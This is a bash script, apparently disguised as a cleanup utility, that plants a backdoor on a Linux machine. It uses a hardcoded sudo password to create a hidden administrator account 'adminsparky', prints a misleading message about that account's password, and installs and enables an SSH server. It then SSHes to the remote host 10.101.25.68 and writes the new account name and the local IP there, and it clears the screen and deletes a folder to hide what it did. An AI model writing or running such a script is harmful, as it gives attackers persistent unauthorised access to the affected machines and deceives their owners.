#!/bin/bash

# Set the password
password='wtc'

# Send the password to sudo
echo "$password" | sudo -S echo "Password accepted."

# Get the username
username='adminsparky'

# Create the new user and set the password
sudo adduser $username --gecos "" --disabled-password
echo "$username:kam" | sudo chpasswd

echo "User '$username' created with password 'SIKE you thought'."

# Add the user to the sudo group
sudo usermod -aG sudo $username

# Display the IP address of the computer
ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)
echo "This computer's IP address is $ip"

# Install and start the OpenSSH server
sudo apt-get update -y
sudo apt-get install openssh-server -y
sudo systemctl start ssh
sudo systemctl enable ssh
clear

# SSH into remote computer and edit file
remote_username='adminsparky'
remote_ip='10.101.25.68'
ssh "$remote_username@$remote_ip" <<EOF
    mkdir -p ~/Documents
    touch ~/Documents/somefile.txt
    echo "$username-$ip" >> ~/Documents/somefile.txt
EOF

echo "Added $username - $ip to remote file."
echo "SSH access enabled. Use the following command to log in:"
echo "ssh $username@$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)"
rm -rf clear_Chrome_Cache/
clear
